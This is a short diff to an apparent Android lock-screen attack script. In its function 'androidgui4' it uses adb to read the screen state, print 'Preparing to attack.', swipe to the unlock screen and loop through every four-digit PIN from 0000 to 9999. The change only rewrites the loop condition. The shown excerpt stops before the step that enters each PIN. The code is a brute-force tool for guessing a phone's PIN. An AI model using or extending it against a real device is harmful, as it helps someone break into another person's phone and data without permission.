@@ -213,7 +213,6 @@ android6() {
 
 
 androidgui4() {
-        infinity=1
         screen="$(adb shell dumpsys nfc | grep 'mScreenState=')"
         case $screen in
             "mScreenState=OFF") echo -e "Preparing to attack."; 
@@ -224,7 +223,8 @@ androidgui4() {
         adb shell input keyevent 3
         adb shell input keyevent 82
         adb shell input swipe 407 1211 378 85
-        while [ $x == 1 ]; do
+        while true
+        do
             for i in {0000..9999}; do
                 if [[ $i != 0000 ]]; then
                     echo -e "\e[0;1mTrying pin:  $i\e[0m"
